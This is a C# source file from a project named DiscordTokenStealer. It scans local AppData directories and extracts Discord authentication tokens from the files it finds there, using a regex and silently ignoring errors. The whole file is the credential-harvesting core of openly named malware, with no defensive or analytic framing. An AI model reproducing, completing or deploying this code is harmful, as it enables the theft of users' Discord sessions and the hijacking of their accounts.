using System.Reflection;
using System.Text.RegularExpressions;
using DiscordTokenStealer.DirectorySearchProviders;

namespace DiscordTokenStealer;

public static class TokenParser
{
    private static readonly Regex TokenRegex = new Regex("((?:mfa|nfa)[.](.*?))\"", RegexOptions.Compiled);
    public static IEnumerable<string> Parse()
    {
        HashSet<string> tokens = new HashSet<string>();
        foreach (FieldInfo field in typeof(AppDataSearchProvider).GetFields(BindingFlags.Static | BindingFlags.Public))
        {
            if (field.DeclaringType != typeof(AppDataSearchProvider))
            {
                continue;
            }
            AppDataSearchProvider? provider = (AppDataSearchProvider?)field.GetValue(null);
            if (provider is not { Exists: true })
            {
                continue;
            }
            tokens.UnionWith(ParseFrom(provider));
        }
        return tokens;
    }

    private static IEnumerable<string> ParseFrom(IDirectorySearchProvider searchProvider)
    {
        return Directory.EnumerateFiles(searchProvider.Directory, searchProvider.Pattern).AsParallel().SelectMany(fileName =>
        {
            try
            {
                return ParseTokens(File.ReadAllText(fileName));
            }
            catch
            {
                return Enumerable.Empty<string>();
            }
        });
    }

    private static IEnumerable<string> ParseTokens(string str)
    {
        return TokenRegex.Matches(str).Where(m => m.Success).Select(match => match.Groups[1].Value);
    }
}